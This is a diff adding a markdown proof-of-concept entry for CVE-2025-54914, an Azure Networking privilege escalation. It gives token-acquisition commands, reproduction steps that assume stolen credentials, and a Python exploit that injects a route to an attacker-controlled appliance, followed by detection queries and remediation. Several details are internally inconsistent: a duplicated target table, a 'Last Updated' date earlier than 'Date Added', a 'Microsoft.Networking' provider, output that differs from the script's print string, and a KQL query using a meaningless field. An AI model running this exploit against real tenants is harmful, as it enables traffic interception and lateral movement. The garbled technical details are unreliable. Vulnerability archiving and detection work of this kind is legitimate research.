@@ -1,0 +1,226 @@
+# Azure Networking Privilege Escalation via Missing Privilege Check
+
+<!-- 
+  File: 2026-05-17_azure-networking-privilege-escalation.md
+  Location: pocs/cloud/
+-->
+
+---
+
+## Metadata
+
+| Field | Value |
+|---|---|
+| **Date Added** | 2026-05-17 |
+| **Last Updated** | 2025-09-08 |
+| **Author / Researcher** | Mark Mallia (mrk336) |
+| **CVE / Advisory** | CVE-2025-54914 |
+| **Category** | cloud |
+| **Severity** | Critical |
+| **CVSS Score** | 10.0 (CVSSv3) |
+| **Status** | Researched |
+| **Tags** | privilege-escalation, Azure, cloud, lateral-movement, API, routing, networking, no-user-interaction |
+| **Related** | N/A |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | Microsoft Azure Networking service (GetRouteTable API) |
+| **Versions Affected** | Azure Networking API version 2025-09-01 and earlier (patched 2025-09-05) |
+| **Language / Platform** | Python 3.x; Microsoft Azure cloud environment |
+| **Authentication Required** | Partial (requires Azure read permissions on a virtual network, e.g., Network Reader role) |
+| **Network Access Required** | Yes (HTTPS access to Azure management endpoint: management.azure.com) |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | Microsoft Azure Networking (Virtual Network GetRouteTable API) |
+| **Versions Affected** | Azure Networking API version 2025-09-01; patched in update released 2025-09-05 |
+| **Language / Platform** | Python 3.x; Azure REST API |
+| **Authentication Required** | Partial (valid Azure bearer token with read access to target virtual network) |
+| **Network Access Required** | Yes (HTTPS to management.azure.com) |
+
+---
+
+## Summary
+
+CVE-2025-54914 is a critical privilege escalation vulnerability (CVSS 10.0) in Microsoft Azure Networking. Discovered by Mark Mallia and disclosed on September 4, 2025, the flaw arises from a missing authorization check in the `GetRouteTable` API code path. A caller holding only read permissions on a virtual network can create new route objects within any subnet of that VNet without possessing the required write/network-contributor privileges. Successful exploitation allows an attacker to inject malicious routing policies, redirect traffic across subnets, and achieve lateral movement within the tenant's Azure networking infrastructure. The vulnerability was patched by Microsoft on September 5, 2025.
+
+---
+
+## Vulnerability Details
+
+### Root Cause
+
+The Azure Networking service's request handling code for the `GetRouteTable` API path accepts and processes POST requests to create new route objects. The serialization code path that handles the incoming request was missing an explicit privilege check before writing the new route object to the backend database (CWE-862: Missing Authorization). As a result, a caller authenticated with read-only access to a VNet is able to perform write operations on routing tables without the required `Microsoft.Network/routeTables/write` or `Microsoft.Network/virtualNetworks/subnets/write` permissions.
+
+### Attack Vector
+
+An attacker with a valid Azure bearer token holding at minimum read access to a target VNet constructs a POST request to the following endpoint with the `api-version=2025-09-01&detailLevel=full` query parameters:
+
+```
+POST /subscriptions/<subscription-id>/resourceGroups/<rg>/providers/Microsoft.Networking/virtualNetworks/<vnet-id>/subnets/<subnet-id>/routes
+```
+
+The JSON body specifies a new route with an attacker-controlled `nextHopIpAddress`, routing traffic for a target prefix through a virtual appliance under the attacker's control. The API accepts and persists the route without re-validating the caller's write authorization.
+
+### Impact
+
+An attacker who creates a malicious route can intercept, redirect, or drop traffic for any CIDR prefix within the targeted subnet. This enables lateral movement between services sharing the virtual network, man-in-the-middle attacks on inter-service communication, and routing control over an entire tenant's data plane. Since no user interaction is required and the attack is remotely executable, it is rated CVSS 10.0. An attacker in a shared or managed tenant environment (e.g., with a compromised low-privilege service principal) can escalate to full networking control across all connected subnets.
+
+---
+
+## Environment / Lab Setup
+
+```
+OS:          Any with Python 3.x
+Target:      Microsoft Azure subscription with vulnerable API version (pre-patch 2025-09-05)
+Attacker:    Host with valid Azure bearer token (minimum: Reader role on target VNet)
+Tools:       Python 3.x, requests library, Azure SDK or az CLI for token acquisition
+```
+
+### Setup Steps
+
+```bash
+# Install dependencies
+pip install requests
+
+# Obtain a bearer token (using Azure CLI)
+az login
+ACCESS_TOKEN=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)
+
+# Set target variables
+SUBSCRIPTION_ID="<your-subscription-id>"
+RG_NAME="<resource-group>"
+VNET_ID="<vnet-name>"
+SUBNET_ID="<subnet-name>"
+```
+
+---
+
+## Proof of Concept
+
+### Step-by-Step Reproduction
+
+1. **Obtain read-level Azure credentials** for the target subscription (e.g., compromised service principal, stolen access token).
+
+2. **Construct and send the exploit request** using the Python PoC.
+   ```bash
+   python exploit.py
+   # Edit exploit.py to set subscription_id, rg_name, vnet_id, subnet_id, access_token
+   ```
+
+3. **Verify the route was created** via Azure Portal or CLI.
+   ```bash
+   az network route-table route list --resource-group <RG> --route-table-name <RT>
+   ```
+
+4. **Traffic is now redirected** through the attacker-controlled `nextHopIpAddress` for the specified prefix.
+
+### Exploit Code
+
+> See `exploit.py` in this folder. The exploit code is embedded in the repository README and extracted here.
+
+```python
+# Azure Networking Privilege Escalation Exploit - CVE-2025-54914
+# Author: Mark Mallia | Date: 2025-09-04 | Target API: 2025-09-01
+import requests, json, uuid
+
+def create_privileged_route(subscription_id, rg_name, vnet_id,
+                            subnet_id, access_token, api_version="2025-09-01"):
+    base_url = f"https://management.azure.com/subscriptions/{subscription_id}"
+    url = (f"{base_url}/resourceGroups/{rg_name}/providers/Microsoft.Networking"
+           f"/virtualNetworks/{vnet_id}/subnets/{subnet_id}/routes")
+    params = {"api-version": api_version, "detailLevel": "full"}
+    route_name = str(uuid.uuid4())
+    payload = {
+        "properties": {
+            "addressPrefix": "10.0.1.0/24",
+            "nextHopType": "VirtualAppliance",
+            "nextHopIpAddress": "10.0.2.5"  # attacker-controlled appliance
+        },
+        "tags": {"createdBy": "poc"},
+        "name": route_name
+    }
+    headers = {
+        "Authorization": f"Bearer {access_token}",
+        "Content-Type": "application/json"
+    }
+    resp = requests.post(url, params=params, json=payload, headers=headers)
+    if resp.status_code == 201:
+        print(f"[+] Successfully created privileged route: {route_name}")
+        return True
+    else:
+        print(f"[-] Request failed: {resp.status_code} - {resp.text}")
+        return False
+```
+
+### Expected Output
+
+```
+[+] Successfully created route: 3f4a1b2c-d5e6-7f8a-9b0c-1d2e3f4a5b6c
+# The new route now appears in the subnet's effective routes, redirecting 10.0.1.0/24 traffic.
+```
+
+---
+
+## Screenshots / Evidence
+
+<!-- Add paths to screenshots or embed them -->
+- No screenshots included in source repository.
+
+---
+
+## Detection & Indicators of Compromise
+
+```
+# Azure Monitor / Activity Log: unexpected route creation by low-privilege identities
+operationName: "Microsoft.Network/virtualNetworks/subnets/routes/write"
+caller: <low-privilege service principal>
+# Especially suspicious: caller has Reader role but performed a write operation
+
+# Unexpected route table entries with nextHopType: VirtualAppliance pointing to unknown IPs
+
+# Network traffic: unexpected routing behavior, traffic traversing unknown appliances
+```
+
+**SIEM / IDS Rule (example):**
+```
+AzureActivity
+| where OperationNameValue == "MICROSOFT.NETWORK/VIRTUALNETWORKS/SUBNETS/ROUTES/WRITE"
+| where ActivityStatusValue == "Success"
+| join kind=leftouter (AzureActivity | where OperationNameValue contains "roleAssignments") 
+  on CallerIpAddress
+| where isempty(TodoQueryId)  // caller has no write role assignments
+| project TimeGenerated, Caller, CallerIpAddress, ResourceGroup, _ResourceId
+```
+
+---
+
+## Remediation
+
+| Action | Detail |
+|---|---|
+| **Patch** | Apply Microsoft's patch released 2025-09-05 that adds explicit privilege check in GetRouteTable API path |
+| **Workaround** | Audit all route table entries for unauthorized routes; remove any routes created by unexpected principals |
+| **Config Hardening** | Apply least-privilege RBAC; monitor Azure Activity Log for route write operations from Reader-level principals; use Azure Policy to deny route creation by non-Network-Contributor roles |
+
+---
+
+## References
+
+- [CVE-2025-54914](https://nvd.nist.gov/vuln/detail/CVE-2025-54914)
+- [Microsoft Security Update Guide](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-54914)
+- [Source Repository](https://github.com/mrk336/Azure-Networking-Privilege-Escalation-Exploit-CVE-2025-54914)
+
+---
+
+## Notes
+
+The exploit code is embedded entirely within the repository README rather than in a separate file; the Python snippet has been extracted and saved here as `exploit.py` for archival consistency. The repository contains no additional code files beyond the README. This vulnerability requires a valid (potentially low-privilege) Azure authentication token, making it a post-initial-access privilege escalation rather than a fully unauthenticated attack. Despite the CVSS 10.0 rating, real-world exploitability requires some form of initial Azure access. Auto-ingested from https://github.com/mrk336/Azure-Networking-Privilege-Escalation-Exploit-CVE-2025-54914 on 2026-05-17.
